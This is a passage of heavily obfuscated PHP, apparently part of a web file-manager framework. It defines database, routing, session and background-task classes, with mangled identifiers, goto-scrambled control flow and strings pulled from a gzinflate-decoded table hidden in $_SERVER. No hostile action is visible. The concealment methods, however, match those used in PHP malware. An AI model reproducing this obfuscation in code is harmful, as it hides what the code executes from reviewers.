gzinflate(substr($_SERVER[ó¬â¥‰ÊÔ¤Ç£][565], 10, -8))); $A¯ÙÁå©” = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][566]; goto fäñ»çŒ–; b´ö‡×áå: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto fÅøùÀ„ˆˆ; Cñ¥å½†Ñ”: $this->in =& $in; $this->values[$Cé¿é®ãê[6]] =& $config; $this->values[$Cé¿é®ãê[7]] =& $in; goto f¹‘§àËĞå; fÅøùÀ„ˆˆ: $Cé¿é®ãê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; global $in, $config; $this->config =& $config; goto Cñ¥å½†Ñ”; f¹‘§àËĞå: $this->tpl = TEMPLATE . MOD . $Cé¿é®ãê[8]; $this->_classObjectID = mt_rand(0, 10000); goto A˜òÈÊÃéé; A˜òÈÊÃéé: } public function loadClass($d‚‚¨¸Œ‚) { if (1 === func_num_args()) { $this->{$d‚‚¨¸Œ‚} = new $d‚‚¨¸Œ‚(); } else { $aö³¡×º· = new ReflectionClass($d‚‚¨¸Œ‚); $d“Öã“ªÓ… = func_get_args(); array_shift($d“Öã“ªÓ…); $this->{$d‚‚¨¸Œ‚} = $aö³¡×º·->newInstanceArgs($d“Öã“ªÓ…); } return $this->{$d‚‚¨¸Œ‚}; } protected function assign($e¯²„‹í, $cùÄŒÍ—Ñ™) { $this->values[$e¯²„‹í] = $cùÄŒÍ—Ñ™; } protected function display($DŒÊŒ×ø…) { ob_end_clean(); extract($this->values); require $this->tpl . $DŒÊŒ×ø…; } } class DbSqliteBase extends Db { public function __construct($FÑÇ¹ÙÑÓ’ = '') { $eñƒñˆ…‹î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!extension_loaded($eñƒñˆ…‹î[9])) { think_exception(think_lang($eñƒñˆ…‹î[10]) . $eñƒñˆ…‹î[11]); } if (!empty($FÑÇ¹ÙÑÓ’)) { if (!isset($FÑÇ¹ÙÑÓ’[$eñƒñˆ…‹î[12]])) { $FÑÇ¹ÙÑÓ’[$eñƒñˆ…‹î[12]] = 438; } $this->config = $FÑÇ¹ÙÑÓ’; if (empty($this->config[$eñƒñˆ…‹î[13]])) { $this->config[$eñƒñˆ…‹î[13]] = array(); } } } public function connect($eÅš§ğº…Ñ = '', $b ß©¶Ò‚Ÿ = 0) { $D×º…£ÍÜÃ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->linkID[$b ß©¶Ò‚Ÿ])) { goto aÄ¸œ•ë¯Í; aÄ¸œ•ë¯Í: if (empty($eÅš§ğº…Ñ)) { $eÅš§ğº…Ñ = $this->config; } $BÜ°å¯¦‹Â = !empty($eÅš§ğº…Ñ[$D×º…£ÍÜÃ[13]][$D×º…£ÍÜÃ[14]]) ? $eÅš§ğº…Ñ[$D×º…£ÍÜÃ[13]][$D×º…£ÍÜÃ[14]] : $this->pconnect; $bÖ‰‹Ò¨†­ = $BÜ°å¯¦‹Â ? $D×º…£ÍÜÃ[15] : $D×º…£ÍÜÃ[16]; goto A¯†£‡š; A¯†£‡š: $this->linkID[$b ß©¶Ò‚Ÿ] = $bÖ‰‹Ò¨†­($eÅš§ğº…Ñ[$D×º…£ÍÜÃ[17]], $eÅš§ğº…Ñ[$D×º…£ÍÜÃ[12]]); if (!$this->linkID[$b ß©¶Ò‚Ÿ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto BëïêïóÑ; BëïêïóÑ: @sqlite_busy_timeout($this->linkID[$b ß©¶Ò‚Ÿ], 30000); if (1 != think_config($D×º…£ÍÜÃ[18])) { unset($this->config); } goto bÔÆÈá’ˆŸ; bÔÆÈá’ˆŸ: } return $this->linkID[$b ß©¶Ò‚Ÿ]; } public function free() { $this->queryID = null; } public function query($d¹÷¶ë§‚¨) { goto AŒ‡ñˆ…×¤; eŠº‰®ê: $this->queryStr = $d¹÷¶ë§‚¨; if ($this->queryID) { $this->free(); } think_action_status($DÆää•ø•È[19], 1); goto FÉç«Á²ó¾; AŒ‡ñˆ…×¤: $DÆää•ø•È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eŠº‰®ê; f‹…°ÖƒÁğ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $E×áŸ–íËï = $this->getAll(); return $E×áŸ–íËï; } goto EŠÎªÃ‡¢Í; FÉç«Á²ó¾: think_status($DÆää•ø•È[20]); $this->queryID = sqlite_query($this->_linkID, $d¹÷¶ë§‚¨); $this->debug(); goto f‹…°ÖƒÁğ; EŠÎªÃ‡¢Í: } public function execute($Bñ÷ñ˜ŠÍ) { goto d£ÎÄö–ˆ‡; cí§‹İçÙ: think_status($E½›óÃ£÷½[20]); $a›‰‹ğÛğ = sqlite_exec($this->_linkID, $Bñ÷ñ˜ŠÍ); $this->debug(); goto bè†ç¬ÆàÔ; bè†ç¬ÆàÔ: if (!1 === $a›‰‹ğÛğ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b¬ù ßèğ±; A©„—ÖÔÑ¹: $this->queryStr = $Bñ÷ñ˜ŠÍ; if ($this->queryID) { $this->free(); } think_action_status($E½›óÃ£÷½[21], 1); goto cí§‹İçÙ; d£ÎÄö–ˆ‡: $E½›óÃ£÷½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A©„—ÖÔÑ¹; b¬ù ßèğ±: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A‘ÉÚ½Ê· = sqlite_query($this->_linkID, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][23]); if (!$A‘ÉÚ½Ê·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DòïÎšğ = sqlite_query($this->_linkID, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][24]); if (!$DòïÎšğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B†»èåÎ‘Æ = array(); if ($this->numRows > 0) { for ($dï«âÆæ—÷ = 0; $dï«âÆæ—÷ < $this->numRows; $dï«âÆæ—÷++) { $B†»èåÎ‘Æ[$dï«âÆæ—÷] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $B†»èåÎ‘Æ; } public function getFields($dóé™Ò¼¦ç) { $B™ŞèŒ‰Ò‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eĞä£‹õ³Ç = $this->query($B™ŞèŒ‰Ò‡[25] . $dóé™Ò¼¦ç . $B™ŞèŒ‰Ò‡[26]); $dë‘â‘Œ† = array(); if ($eĞä£‹õ³Ç) { foreach ($eĞä£‹õ³Ç as $Dï ˆŒ¥Å£ => $fÒÄ³·™Ÿà) { $dë‘â‘Œ†[$fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[27]]] = array($B™ŞèŒ‰Ò‡[28] => $fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[27]], $B™ŞèŒ‰Ò‡[29] => $fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[30]], $B™ŞèŒ‰Ò‡[31] => (bool) ($fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[32]] === $B™ŞèŒ‰Ò‡[33]), $B™ŞèŒ‰Ò‡[34] => $fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[35]], $B™ŞèŒ‰Ò‡[36] => strtolower($fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[37]]) == $B™ŞèŒ‰Ò‡[38], $B™ŞèŒ‰Ò‡[39] => strtolower($fÒÄ³·™Ÿà[$B™ŞèŒ‰Ò‡[40]]) == $B™ŞèŒ‰Ò‡[41]); } } return $dë‘â‘Œ†; } public function getTables($f‚¢’é¸Ò = '') { $Fƒ¥åŒ¹Ë  =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÔÃ„„£Öö = $this->query($Fƒ¥åŒ¹Ë [42] . $Fƒ¥åŒ¹Ë [43] . $Fƒ¥åŒ¹Ë [44]); $c´»ßˆè¿… = array(); foreach ($FÔÃ„„£Öö as $E½œ†éÊÒ½ => $dÔĞ¹¿ê˜Â) { $c´»ßˆè¿…[$E½œ†éÊÒ½] = current($dÔĞ¹¿ê˜Â); } return $c´»ßˆè¿…; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $D™¿œœ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÖàö˜õ…Ï = sqlite_last_error($this->_linkID); $this->error = $dÖàö˜õ…Ï . $D™¿œœ…[4] . sqlite_error_string($dÖàö˜õ…Ï); if ($D™¿œœ…[33] != $this->queryStr) { $this->error .= LNG($D™¿œœ…[45]) . $this->queryStr; } think_trace($this->error, $D™¿œœ…[33], $D™¿œœ…[46]); return $this->error; } public function escapeString($cİÒçÖ¾ƒ²) { return sqlite_escape_string($cİÒçÖ¾ƒ²); } public function parseLimit($FùÃğïÆ) { $cÈ±ò¹º¬Ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¸Œòìƒº = $cÈ±ò¹º¬Ô[33]; if (!empty($FùÃğïÆ)) { $FùÃğïÆ = explode($cÈ±ò¹º¬Ô[47], $FùÃğïÆ); if (count($FùÃğïÆ) > 1) { $E¸Œòìƒº .= $cÈ±ò¹º¬Ô[48] . $FùÃğïÆ[1] . $cÈ±ò¹º¬Ô[49] . $FùÃğïÆ[0] . $cÈ±ò¹º¬Ô[50]; } else { $E¸Œòìƒº .= $cÈ±ò¹º¬Ô[48] . $FùÃğïÆ[0] . $cÈ±ò¹º¬Ô[50]; } } return $E¸Œòìƒº; } } class DbSqlite3Base extends Db { public function __construct($bÑÙˆ×¹˜ã = '') { $F•õ‹©ˆó³ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!class_exists($F•õ‹©ˆó³[51])) { think_exception(think_lang($F•õ‹©ˆó³[10]) . $F•õ‹©ˆó³[52]); } if (!empty($bÑÙˆ×¹˜ã)) { if (!isset($bÑÙˆ×¹˜ã[$F•õ‹©ˆó³[12]])) { $bÑÙˆ×¹˜ã[$F•õ‹©ˆó³[12]] = 438; } $this->config = $bÑÙˆ×¹˜ã; if (empty($this->config[$F•õ‹©ˆó³[13]])) { $this->config[$F•õ‹©ˆó³[13]] = array(); } } } public function connect($FêÎÏÏÔÁ’ = '', $FÊ‘’İƒÆË = 0) { $B™°ÃŞÈ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->linkID[$FÊ‘’İƒÆË])) { if (empty($FêÎÏÏÔÁ’)) { $FêÎÏÏÔÁ’ = $this->config; } $this->linkID[$FÊ‘’İƒÆË] = new SQLite3($FêÎÏÏÔÁ’[$B™°ÃŞÈ¤[17]]); if (!$this->linkID[$FÊ‘’İƒÆË]) { think_exception($this->linkID[$FÊ‘’İƒÆË]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$FÊ‘’İƒÆË]->busyTimeout(30000); if (1 != think_config($B™°ÃŞÈ¤[18])) { unset($this->config); } } return $this->linkID[$FÊ‘’İƒÆË]; } public function free() { $this->queryID = null; } public function query($D•éˆİ«™÷) { goto Câ‚„”Ü’¹; e„çÕ‚èÈ: think_status($b†º½…Í«ì[20]); $this->queryID = $this->_linkID->query($D•éˆİ«™÷); $this->debug(); goto FéÃœº…Âš; Câ‚„”Ü’¹: $b†º½…Í«ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÛÓ°“»æ; bÛÓ°“»æ: $this->queryStr = $D•éˆİ«™÷; if ($this->queryID) { $this->free(); } think_action_status($b†º½…Í«ì[19], 1); goto e„çÕ‚èÈ; FéÃœº…Âš: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aßàÄ„¾Ê¹ = $this->getAll(); $this->numRows = count($aßàÄ„¾Ê¹); return $aßàÄ„¾Ê¹; } goto B¾á…èÏ; B¾á…èÏ: } public function execute($DÛïË¼†âù) { goto e°šîµã˜ô; bÊò†æœÓÏ: $this->queryStr = $DÛïË¼†âù; if ($this->queryID) { $this->free(); } think_action_status($c¢¨‚ˆÁÖŒ[21], 1); goto fŸÔ“”ğ; e°šîµã˜ô: $c¢¨‚ˆÁÖŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÊò†æœÓÏ; b…·²‹‘®¡: if (!1 === $d¨÷¸Ñ´¶„) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto cæµ¹ë ‚Á; fŸÔ“”ğ: think_status($c¢¨‚ˆÁÖŒ[20]); $d¨÷¸Ñ´¶„ = $this->_linkID->exec($DÛïË¼†âù); $this->debug(); goto b…·²‹‘®¡; cæµ¹ë ‚Á: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B‡¿š‹ãô¶ = $this->_linkID->query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][23]); if (!$B‡¿š‹ãô¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÕøĞÏ¹·­ = $this->_linkID->query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][24]); if (!$FÕøĞÏ¹·­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fİ™¹å†¡Û = array(); while ($Fâ‚áââ„ù = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fİ™¹å†¡Û[] = $Fâ‚áââ„ù; } $this->queryID->reset(); return $fİ™¹å†¡Û; } public function getFields($DçËŒò³Ø¹) { $aÒ¬ôƒ¢…Œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cäÆõ•Ô–¼ = $this->query($aÒ¬ôƒ¢…Œ[25] . $DçËŒò³Ø¹ . $aÒ¬ôƒ¢…Œ[26]); $f³ƒáŞËãö = array(); if ($cäÆõ•Ô–¼) { foreach ($cäÆõ•Ô–¼ as $fìÒğ´Áëõ => $dŒøœ¡ÉêÆ) { $f³ƒáŞËãö[$dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[28]]] = array($aÒ¬ôƒ¢…Œ[28] => $dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[28]], $aÒ¬ôƒ¢…Œ[29] => $dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[29]], $aÒ¬ôƒ¢…Œ[31] => (bool) ($dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[31]] === $aÒ¬ôƒ¢…Œ[33]), $aÒ¬ôƒ¢…Œ[34] => $dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[53]], $aÒ¬ôƒ¢…Œ[36] => (bool) $dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[54]], $aÒ¬ôƒ¢…Œ[39] => (bool) $dŒøœ¡ÉêÆ[$aÒ¬ôƒ¢…Œ[54]]); } } return $f³ƒáŞËãö; } public function getTables($B¥àÅ³÷” = '') { $dê‡›İ´Ã¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aäì³Š®“« = $this->query($dê‡›İ´Ã¿[42] . $dê‡›İ´Ã¿[43] . $dê‡›İ´Ã¿[44]); $cØ¡‘ÊÌã = array(); foreach ($Aäì³Š®“« as $C£¾ùÀ‚ â => $EÂ½òòÉÊÕ) { $cØ¡‘ÊÌã[$C£¾ùÀ‚ â] = current($EÂ½òòÉÊÕ); } return $cØ¡‘ÊÌã; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D”¤İƒ‘ª‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->error = $this->_linkID->lastErrorMsg(); if ($D”¤İƒ‘ª‡[33] != $this->queryStr) { $this->error .= LNG($D”¤İƒ‘ª‡[45]) . $this->queryStr; } think_trace($this->error, $D”¤İƒ‘ª‡[33], $D”¤İƒ‘ª‡[46]); return $this->error; } public function escapeString($céÛÁŒÉÈ´) { $BõŞèâøğé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->_linkID) { return $this->_linkID->escapeString($céÛÁŒÉÈ´); } return str_ireplace($BõŞèâøğé[55], $BõŞèâøğé[56], $céÛÁŒÉÈ´); } public function parseLimit($a®à¼ĞªËÄ) { $e” Â ‘ºå =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BºÔğÆ„òÕ = $e” Â ‘ºå[33]; if (!empty($a®à¼ĞªËÄ)) { $a®à¼ĞªËÄ = explode($e” Â ‘ºå[47], $a®à¼ĞªËÄ); if (count($a®à¼ĞªËÄ) > 1) { $BºÔğÆ„òÕ .= $e” Â ‘ºå[48] . $a®à¼ĞªËÄ[1] . $e” Â ‘ºå[49] . $a®à¼ĞªËÄ[0] . $e” Â ‘ºå[50]; } else { $BºÔğÆ„òÕ .= $e” Â ‘ºå[48] . $a®à¼ĞªËÄ[0] . $e” Â ‘ºå[50]; } } return $BºÔğÆ„òÕ; } } goto eå˜ËùÅÚ–; bµï‚×°”È: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\136\x2f\135\53", "\72\156\x75\155" => "\133\x30\55\71\x5d\x2b", "\x3a\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($dÇ¾‰ê©±É, $fƒ ÎÔÑµÇ) { $E²®›’Ÿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($dÇ¾‰ê©±É == $E²®›’Ÿ[1427]) { $dŠÏø„É¤ = array_map($E²®›’Ÿ[1428], $fƒ ÎÔÑµÇ[0]); $CéÕ‡Ìù® = strpos($fƒ ÎÔÑµÇ[1], $E²®›’Ÿ[8]) === 0 ? $fƒ ÎÔÑµÇ[1] : $E²®›’Ÿ[8] . $fƒ ÎÔÑµÇ[1]; $F¼ÔŠŠë = $fƒ ÎÔÑµÇ[2]; } else { $dŠÏø„É¤ = null; $CéÕ‡Ìù® = strpos($fƒ ÎÔÑµÇ[0], $E²®›’Ÿ[8]) === 0 ? $fƒ ÎÔÑµÇ[0] : $E²®›’Ÿ[8] . $fƒ ÎÔÑµÇ[0]; $F¼ÔŠŠë = $fƒ ÎÔÑµÇ[1]; } array_push(self::$maps, $dŠÏø„É¤); array_push(self::$routes, $CéÕ‡Ìù®); array_push(self::$methods, strtoupper($dÇ¾‰ê©±É)); array_push(self::$callbacks, $F¼ÔŠŠë); } public static function error($açËŒĞµËÛ) { self::$errorCallback = $açËŒĞµËÛ; } public static function haltOnMatch($bßÆº³Õ¶¾ = true) { self::$halts = $bßÆº³Õ¶¾; } public static function dispatch() { goto BêàŒ¡‰ƒ; BêàŒ¡‰ƒ: $dö’š©²ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cí°Ş½á®Û = parse_url($_SERVER[$dö’š©²ˆ[1429]], PHP_URL_PATH); $cÅÒœ•Ûõ… = $_SERVER[$dö’š©²ˆ[156]]; goto fì•Êß´„°; fì•Êß´„°: $FŞò³Œƒ¨Á = array_keys(static::$patterns); $dÓ¥ïòùÁÈ = array_values(static::$patterns); $b–Ìæ¼Æ¹† = !1; goto c†’÷ˆÎà; c†’÷ˆÎà: self::$routes = preg_replace($dö’š©²ˆ[1111], $dö’š©²ˆ[8], self::$routes); if (in_array($cí°Ş½á®Û, self::$routes)) { $còÔ¸‹ÆÇ = array_keys(self::$routes, $cí°Ş½á®Û); foreach ($còÔ¸‹ÆÇ as $E‘¦øó‡Ä›) { if (self::$methods[$E‘¦øó‡Ä›] == $cÅÒœ•Ûõ… || self::$methods[$E‘¦øó‡Ä›] == $dö’š©²ˆ[1430] || in_array($cÅÒœ•Ûõ…, self::$maps[$E‘¦øó‡Ä›])) { $b–Ìæ¼Æ¹† = !0; if (!is_object(self::$callbacks[$E‘¦øó‡Ä›])) { $FÕË¼½ = explode($dö’š©²ˆ[8], self::$callbacks[$E‘¦øó‡Ä›]); $b¼ì¢µ£›Ó = end($FÕË¼½); $d‰Ç¬œÏê = explode($dö’š©²ˆ[1431], $b¼ì¢µ£›Ó); $f»‚ãÏ¶ĞÓ = new $d‰Ç¬œÏê[0](); $f»‚ãÏ¶ĞÓ->{$d‰Ç¬œÏê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$E‘¦øó‡Ä›]); if (self::$halts) { return; } } } } } else { $eä°§Èíá = 0; foreach (self::$routes as $E‘¦øó‡Ä›) { if (strpos($E‘¦øó‡Ä›, $dö’š©²ˆ[4]) !== !1) { $E‘¦øó‡Ä› = str_replace($FŞò³Œƒ¨Á, $dÓ¥ïòùÁÈ, $E‘¦øó‡Ä›); } if (preg_match($dö’š©²ˆ[1432] . $E‘¦øó‡Ä› . $dö’š©²ˆ[1433], $cí°Ş½á®Û, $E¸ÈÓ¾Ò“ˆ)) { if (self::$methods[$eä°§Èíá] == $cÅÒœ•Ûõ… || self::$methods[$eä°§Èíá] == $dö’š©²ˆ[1430] || !empty(self::$maps[$eä°§Èíá]) && in_array($cÅÒœ•Ûõ…, self::$maps[$eä°§Èíá])) { $b–Ìæ¼Æ¹† = !0; array_shift($E¸ÈÓ¾Ò“ˆ); if (!is_object(self::$callbacks[$eä°§Èíá])) { $FÕË¼½ = explode($dö’š©²ˆ[8], self::$callbacks[$eä°§Èíá]); $b¼ì¢µ£›Ó = end($FÕË¼½); $d‰Ç¬œÏê = explode($dö’š©²ˆ[1431], $b¼ì¢µ£›Ó); $f»‚ãÏ¶ĞÓ = new $d‰Ç¬œÏê[0](); if (!method_exists($f»‚ãÏ¶ĞÓ, $d‰Ç¬œÏê[1])) { echo $dö’š©²ˆ[1434]; } else { call_user_func_array(array($f»‚ãÏ¶ĞÓ, $d‰Ç¬œÏê[1]), $E¸ÈÓ¾Ò“ˆ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$eä°§Èíá], $E¸ÈÓ¾Ò“ˆ); if (self::$halts) { return; } } } } $eä°§Èíá++; } } if ($b–Ìæ¼Æ¹† == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D¾Ìã—ˆØª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; header($_SERVER[$D¾Ìã—ˆØª[1435]] . $D¾Ìã—ˆØª[1436]); echo $D¾Ìã—ˆØª[1437]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dö’š©²ˆ[1429]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto FÀªÙÃÈÌ§; FÀªÙÃÈÌ§: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto e„ğ—Šğ÷¡; E¶Œ‰¶èÁ‘: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C´ƒ¿‡·Ò = new self(); return $C´ƒ¿‡·Ò; goto Eƒöº³ªæŸ; e„ğ—Šğ÷¡: $e¼ƒöí˜½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $C´ƒ¿‡·Ò = false; if ($C´ƒ¿‡·Ò) { return $C´ƒ¿‡·Ò; } goto Bî†ŒÀêÓŞ; Bî†ŒÀêÓŞ: $C²¥Ğ¢ˆ«ƒ = $GLOBALS[$e¼ƒöí˜½[6]][$e¼ƒöí˜½[345]]; self::$sessionTime = $C²¥Ğ¢ˆ«ƒ[$e¼ƒöí˜½[1438]]; $Cæ÷ïìğ = isset($GLOBALS[$e¼ƒöí˜½[1439]]) ? $GLOBALS[$e¼ƒöí˜½[1439]] : SESSION_ID; goto eÖòŠÜ ª†; bä™—Å¶óâ: $DÆšÙå¹¡ = $C²¥Ğ¢ˆ«ƒ[$FœÆ™òšĞÀ]; $eÎàÆÀİ¥ = $C²¥Ğ¢ˆ«ƒ[$e¼ƒöí˜½[748]]; switch ($FœÆ™òšĞÀ) { case $e¼ƒöí˜½[17]: self::$handle = Model($e¼ƒöí˜½[749]); break; case $e¼ƒöí˜½[750]: self::$handle = new CacheRedis($DÆšÙå¹¡, $eÎàÆÀİ¥); break; case $e¼ƒöí˜½[751]: self::$handle = new CacheMemcached($DÆšÙå¹¡, $eÎàÆÀİ¥); break; case $e¼ƒöí˜½[173]: $DÆšÙå¹¡[$e¼ƒöí˜½[75]] = $DÆšÙå¹¡[$e¼ƒöí˜½[75]] . $e¼ƒöí˜½[1441]; self::$handle = new CacheFile($DÆšÙå¹¡, $eÎàÆÀİ¥); default: break; } goto E¶Œ‰¶èÁ‘; eÖòŠÜ ª†: if (self::$sessionSign) { } else { if (Cookie::get($Cæ÷ïìğ)) { self::$sessionSign = Cookie::get($Cæ÷ïìğ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Cæ÷ïìğ, self::$sessionSign, self::$sessionTime); $FœÆ™òšĞÀ = $C²¥Ğ¢ˆ«ƒ[$e¼ƒöí˜½[1440]]; goto bä™—Å¶óâ; Eƒöº³ªæŸ: } public static function sign($f—ÉË‹Ã«í = false) { $f—ÉË‹Ã«í && (self::$sessionSign = $f—ÉË‹Ã«í); self::init(); return self::$sessionSign; } public static function set($dŠà‡õ¡‘Ñ, $d±»£¬¨“Š = false) { self::init(); if (is_array($dŠà‡õ¡‘Ñ)) { foreach ($dŠà‡õ¡‘Ñ as $Fİ–Ñ›ƒÆé => $d•á§ñ÷Í) { array_set_value(self::$data, $Fİ–Ñ›ƒÆé, $d•á§ñ÷Í); } } else { array_set_value(self::$data, $dŠà‡õ¡‘Ñ, $d±»£¬¨“Š); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($e‘˜‰¢°ì = false) { self::init(); if (!$e‘˜‰¢°ì) { return self::$data; } return array_get_value(self::$data, $e‘˜‰¢°ì); } public static function remove($DË»±—‚À¨) { self::init(); unset(self::$data[$DË»±—‚À¨]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][753])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto aä†í­ğÅ; aä†í­ğÅ: $Dì‡œÒ ¨× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::valueGet($Dì‡œÒ ¨×[683]) != $Dì‡œÒ ¨×[86]) { return; } if (self::valueGet($Dì‡œÒ ¨×[1442]) == $Dì‡œÒ ¨×[86]) { $a‚‡Á·Ëµí = self::valueGet($Dì‡œÒ ¨×[1443]); if (time() - $a‚‡Á·Ëµí > 3600 * 2) { self::restart(); } return; } goto dÅ’ªŸíŸ; A©­œ¸©»: while (!0) { self::cacheClear(); if (self::valueGet($Dì‡œÒ ¨×[683]) != $Dì‡œÒ ¨×[86]) { self::valueSet($Dì‡œÒ ¨×[1442], $Dì‡œÒ ¨×[486]); self::log($Dì‡œÒ ¨×[1446]); die; } self::valueSet($Dì‡œÒ ¨×[1442], $Dì‡œÒ ¨×[86]); self::valueSet($Dì‡œÒ ¨×[1443], time()); self::taskRunAll(); sleep(self::valueGet($Dì‡œÒ ¨×[1447])); } goto E¶ÀÔ“ò; dÅ’ªŸíŸ: http_close(); self::valueSet($Dì‡œÒ ¨×[1442], $Dì‡œÒ ¨×[86]); Hook::bind($Dì‡œÒ ¨×[1444], $Dì‡œÒ ¨×[1445]); goto A©­œ¸©»; E¶ÀÔ“ò: } public static function restart() { $aÂå”Ÿ³‹ß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; http_close(); self::valueSet($aÂå”Ÿ³‹ß[683], $aÂå”Ÿ³‹ß[486]); sleep(self::valueGet($aÂå”Ÿ³‹ß[1447]) + 5); self::valueSet($aÂå”Ÿ³‹ß[1442], $aÂå”Ÿ³‹ß[486]); self::valueSet($aÂå”Ÿ³‹ß[683], $aÂå”Ÿ³‹ß[86]); } public static function shutdownEvent() { $Aöº­Ì†ŒÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::valueSet($Aöº­Ì†ŒÁ[1442], $Aöº­Ì†ŒÁ[486]); self::log($Aöº­Ì†ŒÁ[1448]); } public static function config($e«ÂäŞ„´Å, $FÙ·´ƒ¦„») { $föÌ±Ù”‹ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Câ¨Š¼¡‡ˆ = 10; $FÙ·´ƒ¦„» = intval($FÙ·´ƒ¦„») <= $Câ¨Š¼¡‡ˆ ? $Câ¨Š¼¡‡ˆ : intval($FÙ·´ƒ¦„»); self::valueSet($föÌ±Ù”‹ô[683], $e«ÂäŞ„´Å); self::valueSet($föÌ±Ù”‹ô[1447], 